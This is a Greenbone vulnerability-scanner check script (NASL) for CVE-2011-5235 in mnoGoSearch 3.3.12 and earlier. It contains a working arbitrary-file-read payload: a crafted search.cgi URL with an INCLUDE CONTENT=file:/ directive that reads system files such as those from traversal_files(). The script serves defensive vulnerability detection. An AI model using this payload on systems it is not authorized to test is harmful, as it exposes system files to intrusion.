# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803438");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2013-03-15 11:19:57 +0530 (Fri, 15 Mar 2013)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2011-5235");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("mnoGoSearch <= 3.3.12 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"mnoGoSearch is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Multiple flaws due to:

  - Error when parsing certain QUERY_STRING parameters.

  - Input passed via 'STORED' parameter to search/index.html (when 'q' is set to 'x') is not
  properly sanitized before being returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML or web script in a user's browser session in context of an affected site and
  disclose the content of an arbitrary file.");

  script_tag(name:"affected", value:"mnoGoSearch version 3.3.12 and prior.");

  script_tag(name:"solution", value:"Update to version 3.3.13 or later.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/52401");
  script_xref(name:"URL", value:"http://securitytracker.com/id?1028247");
  script_xref(name:"URL", value:"http://en.securitylab.ru/lab/PT-2013-17");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24630");
  script_xref(name:"URL", value:"http://www.mnogosearch.org/doc33/msearch-changelog.html");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120650/mnoGoSearch-3.3.12-Arbitrary-File-Read.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

foreach dir (make_list_unique("/", "/cgi-bin", "/mnogosearch", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";

  res = http_get_cache(port: port, item: dir + "/search.cgi");
  if (!res || res !~ "^HTTP/1\.[01] 200" || ">mnoGoSearch:" >!< res)
    continue;

  files = traversal_files();

  foreach file (keys(files)) {
    url = dir + "/search.cgi/%0A%3C!--top--%3E%0A%3C!INCLUDE%20CONTENT=%22file:/" + files[file] +
          "%22%3E%0A%3C!--/top--%3E?-d/proc/self/environ";

    if (http_vuln_check(port: port, url: url, pattern: file)) {
      report = http_report_vuln_url(port: port, url: url);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
